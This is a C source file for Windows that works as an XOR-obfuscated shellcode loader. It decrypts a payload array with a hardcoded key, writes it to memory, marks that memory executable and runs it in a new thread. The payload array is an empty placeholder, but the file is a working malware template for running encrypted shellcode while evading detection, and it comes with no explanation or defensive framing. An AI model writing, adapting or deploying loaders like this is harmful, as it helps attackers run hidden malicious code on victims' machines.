#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char my_payload[]	  = {0x00}; 
unsigned int  my_payload_len  = sizeof(my_payload);
char		  my_secret_key[] = "mysupersecretkey";

void XOR(char* data, size_t data_len, char* key, size_t key_len)
{
	int j; 
	j = 0; 
	for (int i = 0; i < data_len; i++)
	{
		if (j == key_len - 1) j = 0;
		data[i] = data[i] ^ key[j];
		j++;

	}
}

int main(void)
{
	void*	my_payload_mem; 
	BOOL	rv;
	HANDLE	th; 
	DWORD   oldprotect = 0;


	my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	XOR((char*)my_payload, my_payload_len, my_secret_key, sizeof(my_secret_key));
	RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);

	rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if(rv != 0)
	{
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}
	return 0;
}